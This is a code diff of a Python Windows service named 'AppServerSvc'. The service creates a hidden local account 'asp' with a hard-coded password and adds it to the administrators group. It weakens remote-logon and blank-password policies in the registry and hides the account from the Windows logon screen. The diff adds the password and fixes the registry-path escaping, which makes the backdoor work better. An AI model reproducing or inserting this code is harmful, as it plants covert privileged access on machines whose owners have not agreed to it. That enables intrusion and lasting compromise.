@@ -107,7 +107,7 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
             try:
                     if sinit == '0':
                             #os.system("net.exe user Administrator /active:yes")
-                            os.system("net.exe user asp /add")
+                            os.system("net.exe user asp Qwerty12 /add")
                             os.system("net.exe localgroup administrators asp /add")
                             os.system("reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v forceguest /t REG_DWORD /d 0 /f")
                             os.system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f")
@@ -115,11 +115,11 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
                             os.system("reg add hklm\\system\\currentcontrolset\\control\\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f")
                             if not os.path.exists('c:\windows\syswow64'):
                                     os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f')
-                                    os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\UserList" /f')
+                                    os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f')
                                     os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f')
                             else:
                                     os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f /reg:64')
-                                    os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\UserList" /f /reg:64')
+                                    os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f /reg:64')
                                     #os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v Administrator /t REG_DWORD /d 0 /f /reg:64')
                                     os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f /reg:64')
                             
